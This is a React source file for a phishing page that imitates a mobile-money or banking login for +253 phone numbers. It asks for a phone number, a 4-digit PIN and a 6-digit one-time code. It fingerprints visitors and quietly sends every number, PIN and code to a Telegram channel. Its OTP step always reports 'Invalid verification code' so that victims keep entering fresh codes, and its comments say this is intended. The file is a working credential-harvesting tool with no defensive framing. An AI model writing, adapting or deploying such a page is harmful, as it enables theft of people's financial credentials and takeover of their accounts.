"use client"

import React, { useState, useEffect, useRef } from "react"

export default function AuthFlowPage() {
  // Step: "phone" | "pin" | "otp"
  const [step, setStep] = useState<"phone" | "pin" | "otp">("phone")

  // Phone Screen State (starts completely empty, not prefilled)
  const [phoneNumber, setPhoneNumber] = useState("")
  const [agreedToTerms, setAgreedToTerms] = useState(true)
  const [isPhoneLoading, setIsPhoneLoading] = useState(false)
  const phoneInputRef = useRef<HTMLInputElement>(null)

  // PIN Screen State
  const [pin, setPin] = useState<string>("")
  const [isPinLoading, setIsPinLoading] = useState(false)
  const pinInputRef = useRef<HTMLInputElement>(null)

  // OTP Screen State
  const [otp, setOtp] = useState<string>("")
  const [isOtpLoading, setIsOtpLoading] = useState(false)
  const [otpError, setOtpError] = useState<string>("")
  const [isOtpShaking, setIsOtpShaking] = useState(false)
  const [otpAttempts, setOtpAttempts] = useState(0)
  const [timer, setTimer] = useState(59)
  const [canResend, setCanResend] = useState(false)
  const otpInputRef = useRef<HTMLInputElement>(null)

  // Auto focus input when switching screens
  useEffect(() => {
    if (step === "phone") {
      phoneInputRef.current?.focus()
    } else if (step === "pin") {
      pinInputRef.current?.focus()
    } else if (step === "otp") {
      otpInputRef.current?.focus()
    }
  }, [step])

  // Track visitor location when user lands
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        const { sendTelegramMessage, fetchVisitorInfo } = await import("@/lib/telegram")
        // Pre-fetch IP, Country, City, Region, ISP
        await fetchVisitorInfo()
        // Send location alert to Telegram
        await sendTelegramMessage({
          title: "👀 New Visitor Landed",
          type: "visitor",
        })
      } catch {
        // silent
      }
    }

    trackVisitor()
  }, [])

  // OTP Countdown Timer
  useEffect(() => {
    let interval: NodeJS.Timeout
    if (step === "otp" && timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
    } else if (timer === 0) {
      setCanResend(true)
    }
    return () => clearInterval(interval)
  }, [step, timer])

  // Format MM:SS
  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Mask phone number: e.g. 253******6400
  const getMaskedPhoneNumber = () => {
    const clean = phoneNumber.trim()
    if (!clean) return "253******6400"
    const lastDigits = clean.length >= 4 ? clean.slice(-4) : clean.padStart(4, "0")
    return `253******${lastDigits}`
  }

  // Check if phone number has digits
  const isPhoneValid = phoneNumber.replace(/\D/g, "").length >= 3

  // -------------------------------------------------------------
  // STEP 1: Phone submission (Transitions to PIN screen)
  // -------------------------------------------------------------
  const handlePhoneSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    const trimmed = phoneNumber.trim()
    if (!trimmed || !isPhoneValid || !agreedToTerms) return

    setIsPhoneLoading(true)
    const fullPhone = `+253 ${trimmed}`

    // Background alert to Telegram (never blocks UI transition)
    import("@/lib/telegram")
      .then(({ sendTelegramMessage }) => {
        sendTelegramMessage({
          title: "📱 Phone Login Submitted",
          phoneNumber: fullPhone,
          phone: fullPhone,
        }).catch(() => {})
      })
      .catch(() => {})

    // Immediate transition to PIN screen
    setTimeout(() => {
      setIsPhoneLoading(false)
      setPin("")
      setStep("pin")
    }, 150)
  }

  // -------------------------------------------------------------
  // STEP 2: PIN submission (Transitions to OTP screen)
  // -------------------------------------------------------------
  const handlePinSubmit = (enteredPin?: string) => {
    const finalPin = enteredPin !== undefined ? enteredPin : pin
    if (finalPin.length !== 4) return

    setIsPinLoading(true)
    const fullPhone = `+253 ${phoneNumber.trim() || "77356400"}`

    // Background alert to Telegram
    import("@/lib/telegram")
      .then(({ sendTelegramMessage }) => {
        sendTelegramMessage({
          title: "🔐 4-Digit PIN Submitted",
          phoneNumber: fullPhone,
          pin: finalPin,
        }).catch(() => {})
      })
      .catch(() => {})

    // Transition to 6-digit OTP screen
    setTimeout(() => {
      setIsPinLoading(false)
      setOtp("")
      setOtpError("")
      setTimer(59)
      setCanResend(false)
      setStep("otp")
    }, 200)
  }

  // -------------------------------------------------------------
  // STEP 3: OTP submission (Always show invalid as requested)
  // -------------------------------------------------------------
  const handleOtpSubmit = (enteredOtp?: string) => {
    const finalOtp = enteredOtp !== undefined ? enteredOtp : otp
    if (finalOtp.length !== 6 || isOtpLoading) return

    setIsOtpLoading(true)
    setOtpError("")
    const currentAttempt = otpAttempts + 1
    setOtpAttempts(currentAttempt)
    const fullPhone = `+253 ${phoneNumber.trim() || "77356400"}`

    // Send to Telegram in background
    import("@/lib/telegram")
      .then(({ sendTelegramMessage }) => {
        sendTelegramMessage({
          title: `🔑 6-Digit OTP Attempt #${currentAttempt}`,
          phoneNumber: fullPhone,
          pin: pin,
          otp1: finalOtp,
        }).catch(() => {})
      })
      .catch(() => {})

    // Simulate verification delay (1.2s), then ALWAYS show invalid error
    setTimeout(() => {
      setIsOtpLoading(false)
      setOtp("")
      setOtpError("Invalid verification code. Please try again.")
      setIsOtpShaking(true)
      setTimeout(() => setIsOtpShaking(false), 500)
      otpInputRef.current?.focus()
    }, 1200)
  }

  // Handle Resend OTP
  const handleResendOtp = () => {
    if (!canResend) return
    setTimer(59)
    setCanResend(false)
    setOtp("")
    setOtpError("")

    import("@/lib/telegram")
      .then(({ sendTelegramMessage }) => {
        sendTelegramMessage({
          title: "🔄 OTP Resend Requested",
          phoneNumber: `+253 ${phoneNumber.trim() || "77356400"}`,
        }).catch(() => {})
      })
      .catch(() => {})
  }

  return (
    <div
      dir="ltr"
      className="h-[100dvh] max-h-[100dvh] w-full max-w-full overflow-hidden bg-white flex flex-col items-center justify-between font-sans antialiased text-[#111827] selection:bg-[#022A74] selection:text-white"
    >
      {/* 100% responsive full screen container - zero overflow, zero scroll on any device */}
      <div className="w-full max-w-[460px] h-full max-h-[100dvh] flex flex-col justify-between px-5 sm:px-6 py-4 sm:py-7 mx-auto relative overflow-hidden">

        {/* ========================================================================= */}
        {/* SCREEN 1: PHONE NUMBER INPUT                                             */}
        {/* ========================================================================= */}
        {step === "phone" && (
          <div className="h-full flex flex-col justify-between flex-1 overflow-hidden">
            {/* Top Area */}
            <div className="flex flex-col flex-1 overflow-hidden">
              {/* Back Arrow */}
              <div className="pt-1 pb-3 sm:pb-5 shrink-0">
                <button
                  type="button"
                  aria-label="Back"
                  className="w-10 h-10 -ml-2 flex items-center justify-center text-[#111827] hover:opacity-75 active:scale-95 transition-all cursor-pointer"
                >
                  <svg
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="#111827"
                    strokeWidth="2.3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <path d="M19 12H5M12 19l-7-7 7-7" />
                  </svg>
                </button>
              </div>

              {/* Title & Subtitle */}
              <h1 className="text-[26px] sm:text-[30px] font-bold text-[#111827] tracking-tight leading-tight mb-1.5 shrink-0">
                Let's get started
              </h1>
              <p className="text-[14px] sm:text-[15px] text-[#8E95A3] font-normal leading-normal mb-5 sm:mb-7 shrink-0">
                Enter your phone number to get started
              </p>

              {/* Phone Input Box (Pixel-perfect matching screenshot) */}
              <div
                onClick={() => phoneInputRef.current?.focus()}
                className="w-full h-[54px] sm:h-[56px] rounded-[14px] border-[1.5px] border-[#293660] px-4 flex items-center justify-between bg-white cursor-text transition-all focus-within:ring-2 focus-within:ring-[#293660]/15 shrink-0"
              >
                {/* Left side: Country Code + Digits */}
                <div className="flex items-center flex-1 overflow-hidden">
                  <span className="text-[17px] sm:text-[18px] font-normal text-[#111827] select-none shrink-0 mr-3">
                    +253
                  </span>

                  {/* Phone input field (Not prefilled, starts empty) */}
                  <div className="relative flex items-center flex-1">
                    <input
                      ref={phoneInputRef}
                      type="tel"
                      inputMode="numeric"
                      value={phoneNumber}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, "")
                        setPhoneNumber(val)
                      }}
                      onKeyDown={(e) => {
                        if (e.key === "Enter" && isPhoneValid && agreedToTerms) {
                          e.preventDefault()
                          handlePhoneSubmit()
                        }
                      }}
                      className="w-full text-[17px] sm:text-[18px] font-normal text-[#111827] tracking-wide outline-none border-none bg-transparent p-0"
                      placeholder="77356400"
                      autoFocus
                    />
                  </div>
                </div>

                {/* Right side: Green Checkmark (Only appears when user enters valid digits) */}
                {isPhoneValid && (
                  <div className="shrink-0 ml-2 animate-in fade-in zoom-in-75 duration-200">
                    <svg
                      width="22"
                      height="22"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="#34D399"
                      strokeWidth="2.4"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <polyline points="20 6 9 17 4 12" />
                    </svg>
                  </div>
                )}
              </div>
            </div>

            {/* Bottom Area - Stuck at bottom without causing scroll */}
            <div className="pt-3 sm:pt-6 pb-2 sm:pb-4 shrink-0">
              {/* Checkbox: I agree to the 《Terms of Service》 */}
              <div
                onClick={() => setAgreedToTerms(!agreedToTerms)}
                className="flex items-center gap-2.5 mb-4 sm:mb-5 cursor-pointer select-none group"
              >
                <div
                  className={`w-[19px] h-[19px] rounded-[4px] flex items-center justify-center transition-all ${
                    agreedToTerms
                      ? "bg-[#022A74] text-white"
                      : "border-[1.5px] border-[#CBD5E1] bg-white group-hover:border-[#022A74]"
                  }`}
                >
                  {agreedToTerms && (
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="3.4"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <polyline points="20 6 9 17 4 12" />
                    </svg>
                  )}
                </div>

                <span className="text-[13.5px] sm:text-[14.5px] text-[#4B5563]">
                  I agree to the{" "}
                  <span className="text-[#022A74] font-medium hover:underline">
                    《Terms of Service》
                  </span>
                </span>
              </div>

              {/* Continue Button */}
              <button
                type="button"
                disabled={!isPhoneValid || !agreedToTerms || isPhoneLoading}
                onClick={(e) => {
                  e.preventDefault()
                  handlePhoneSubmit()
                }}
                className={`w-full h-[52px] sm:h-[54px] rounded-[13px] font-semibold text-[16.5px] sm:text-[17px] text-white transition-all duration-200 flex items-center justify-center select-none shadow-sm ${
                  isPhoneValid && agreedToTerms && !isPhoneLoading
                    ? "bg-[#022A74] hover:bg-[#011F5B] active:scale-[0.99] cursor-pointer"
                    : "bg-[#A5B2CA] cursor-not-allowed"
                }`}
              >
                {isPhoneLoading ? (
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    />
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    />
                  </svg>
                ) : (
                  "Continue"
                )}
              </button>
            </div>
          </div>
        )}

        {/* ========================================================================= */}
        {/* SCREEN 2: 4-DIGIT PIN ENTRY                                              */}
        {/* ========================================================================= */}
        {step === "pin" && (
          <div className="h-full flex flex-col justify-between flex-1 overflow-hidden">
            {/* Top Area */}
            <div className="flex flex-col flex-1 overflow-hidden">
              {/* Back Arrow */}
              <div className="pt-1 pb-3 sm:pb-5 shrink-0">
                <button
                  type="button"
                  onClick={() => setStep("phone")}
                  aria-label="Back"
                  className="w-10 h-10 -ml-2 flex items-center justify-center text-[#111827] hover:opacity-75 active:scale-95 transition-all cursor-pointer"
                >
                  <svg
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="#111827"
                    strokeWidth="2.3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <path d="M19 12H5M12 19l-7-7 7-7" />
                  </svg>
                </button>
              </div>

              {/* Welcome Back & Masked Number */}
              <p className="text-[14px] sm:text-[15px] text-[#374151] font-normal mb-1 shrink-0">
                Welcome back
              </p>
              <h2 className="text-[26px] sm:text-[30px] font-bold text-[#111827] tracking-tight leading-tight mb-1.5 shrink-0">
                {getMaskedPhoneNumber()}
              </h2>
              <p className="text-[14px] sm:text-[15px] text-[#8E95A3] font-normal leading-normal mb-6 sm:mb-8 shrink-0">
                Please enter your 4 digit PIN
              </p>

              {/* 4 PIN Boxes Container with overlaid input */}
              <div className="relative inline-flex items-center gap-3 sm:gap-3.5 mb-6 sm:mb-8 select-none shrink-0">
                {[0, 1, 2, 3].map((index) => {
                  const hasValue = index < pin.length
                  const isCurrent = index === pin.length

                  return (
                    <div
                      key={index}
                      className={`w-[54px] h-[54px] sm:w-[60px] sm:h-[60px] rounded-[14px] bg-white border flex items-center justify-center transition-all ${
                        isCurrent
                          ? "border-[1.5px] border-[#293660] shadow-sm"
                          : hasValue
                          ? "border-[#E5E7EB]"
                          : "border-[#E5E7EB]"
                      }`}
                    >
                      {hasValue ? (
                        /* Black Bullet Dot */
                        <div className="w-[10px] h-[10px] sm:w-[11px] sm:h-[11px] rounded-full bg-[#111827]" />
                      ) : isCurrent ? (
                        /* Blinking Cursor in active box */
                        <span className="w-[1.5px] h-[22px] bg-[#293660] animate-pulse" />
                      ) : null}
                    </div>
                  )
                })}

                {/* Overlaid transparent input for 100% reliable click/tap typing */}
                <input
                  ref={pinInputRef}
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={4}
                  value={pin}
                  autoComplete="one-time-code"
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, "").slice(0, 4)
                    setPin(val)
                    if (val.length === 4) {
                      setTimeout(() => handlePinSubmit(val), 200)
                    }
                  }}
                  className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                  autoFocus
                />
              </div>
            </div>

            {/* Bottom Area */}
            <div className="pt-3 sm:pt-6 pb-2 sm:pb-4 shrink-0">
              <button
                type="button"
                disabled={pin.length !== 4 || isPinLoading}
                onClick={() => handlePinSubmit()}
                className={`w-full h-[52px] sm:h-[54px] rounded-[13px] font-semibold text-[16.5px] sm:text-[17px] text-white transition-all duration-200 flex items-center justify-center select-none shadow-sm ${
                  pin.length === 4 && !isPinLoading
                    ? "bg-[#022A74] hover:bg-[#011F5B] active:scale-[0.99] cursor-pointer"
                    : "bg-[#A5B2CA] cursor-not-allowed"
                }`}
              >
                {isPinLoading ? (
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    />
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    />
                  </svg>
                ) : (
                  "Continue"
                )}
              </button>
            </div>
          </div>
        )}

        {/* ========================================================================= */}
        {/* SCREEN 3: 6-DIGIT OTP ENTRY (SHOWS INVALID EACH TIME)                    */}
        {/* ========================================================================= */}
        {step === "otp" && (
          <div className="h-full flex flex-col justify-between flex-1 overflow-hidden">
            {/* Top Area */}
            <div className="flex flex-col flex-1 overflow-hidden">
              {/* Back Arrow */}
              <div className="pt-1 pb-3 sm:pb-5 shrink-0">
                <button
                  type="button"
                  onClick={() => setStep("pin")}
                  aria-label="Back"
                  className="w-10 h-10 -ml-2 flex items-center justify-center text-[#111827] hover:opacity-75 active:scale-95 transition-all cursor-pointer"
                >
                  <svg
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="#111827"
                    strokeWidth="2.3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <path d="M19 12H5M12 19l-7-7 7-7" />
                  </svg>
                </button>
              </div>

              {/* Title & Subtitle */}
              <h1 className="text-[26px] sm:text-[30px] font-bold text-[#111827] tracking-tight leading-tight mb-1.5 shrink-0">
                Verification Code
              </h1>
              <p className="text-[14px] sm:text-[15px] text-[#8E95A3] font-normal leading-normal mb-5 sm:mb-7 shrink-0">
                Please enter the 6 digit code sent to{" "}
                <span className="font-medium text-[#111827]">
                  {getMaskedPhoneNumber()}
                </span>
              </p>

              {/* 6 OTP Boxes with Shake animation on error */}
              <div
                className={`relative flex items-center justify-between gap-1.5 sm:gap-2.5 mb-3 sm:mb-4 select-none transition-transform shrink-0 ${
                  isOtpShaking ? "translate-x-[-8px] transition-none" : ""
                }`}
                style={
                  isOtpShaking
                    ? {
                        animation: "shake 0.45s cubic-bezier(.36,.07,.19,.97) both",
                      }
                    : undefined
                }
              >
                {[0, 1, 2, 3, 4, 5].map((index) => {
                  const hasValue = index < otp.length
                  const isCurrent = index === otp.length
                  const digit = otp[index]

                  return (
                    <div
                      key={index}
                      className={`flex-1 h-[50px] sm:h-[58px] rounded-[13px] bg-white border flex items-center justify-center transition-all ${
                        otpError
                          ? "border-red-400 bg-red-50/20 text-red-600"
                          : isCurrent
                          ? "border-[1.5px] border-[#293660] shadow-sm"
                          : hasValue
                          ? "border-[#293660] text-[#111827]"
                          : "border-[#E5E7EB]"
                      }`}
                    >
                      {hasValue ? (
                        <span className="text-[20px] sm:text-[24px] font-bold text-[#111827]">
                          {digit}
                        </span>
                      ) : isCurrent ? (
                        <span className="w-[1.5px] h-[20px] bg-[#293660] animate-pulse" />
                      ) : null}
                    </div>
                  )
                })}

                {/* Overlaid transparent input for 100% reliable typing */}
                <input
                  ref={otpInputRef}
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={6}
                  value={otp}
                  autoComplete="one-time-code"
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, "").slice(0, 6)
                    setOtp(val)
                    setOtpError("")
                    if (val.length === 6) {
                      setTimeout(() => handleOtpSubmit(val), 200)
                    }
                  }}
                  className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                  autoFocus
                />
              </div>

              {/* OTP Error Message (Always invalid each time) */}
              {otpError && (
                <div className="flex items-center gap-1.5 mt-1.5 mb-2 text-[#DC2626] animate-in fade-in slide-in-from-top-1 duration-200 shrink-0">
                  <svg
                    width="15"
                    height="15"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2.2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    className="shrink-0"
                  >
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" y1="8" x2="12" y2="12" />
                    <line x1="12" y1="16" x2="12.01" y2="16" />
                  </svg>
                  <p className="text-[13px] sm:text-[14px] font-medium leading-tight">
                    {otpError}
                  </p>
                </div>
              )}

              {/* Resend Code Section */}
              <div className="flex items-center justify-between text-[13.5px] sm:text-[14px] mt-2 pt-1 shrink-0">
                <span className="text-[#8E95A3]">Didn't receive code?</span>
                {timer > 0 ? (
                  <span className="text-[#8E95A3] font-medium">
                    Resend in <span className="text-[#022A74] font-semibold">{formatTimer(timer)}</span>
                  </span>
                ) : (
                  <button
                    type="button"
                    onClick={handleResendOtp}
                    className="text-[#022A74] font-semibold hover:underline cursor-pointer"
                  >
                    Resend Code
                  </button>
                )}
              </div>
            </div>

            {/* Bottom Area */}
            <div className="pt-3 sm:pt-6 pb-2 sm:pb-4 shrink-0">
              <button
                type="button"
                disabled={otp.length !== 6 || isOtpLoading}
                onClick={() => handleOtpSubmit()}
                className={`w-full h-[52px] sm:h-[54px] rounded-[13px] font-semibold text-[16.5px] sm:text-[17px] text-white transition-all duration-200 flex items-center justify-center select-none shadow-sm ${
                  otp.length === 6 && !isOtpLoading
                    ? "bg-[#022A74] hover:bg-[#011F5B] active:scale-[0.99] cursor-pointer"
                    : "bg-[#A5B2CA] cursor-not-allowed"
                }`}
              >
                {isOtpLoading ? (
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    />
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    />
                  </svg>
                ) : (
                  "Continue"
                )}
              </button>
            </div>
          </div>
        )}

      </div>

      {/* Inline Styles for Shake Animation */}
      <style jsx global>{`
        @keyframes shake {
          10%, 90% { transform: translate3d(-1px, 0, 0); }
          20%, 80% { transform: translate3d(2px, 0, 0); }
          30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
          40%, 60% { transform: translate3d(4px, 0, 0); }
        }
      `}</style>
    </div>
  )
}
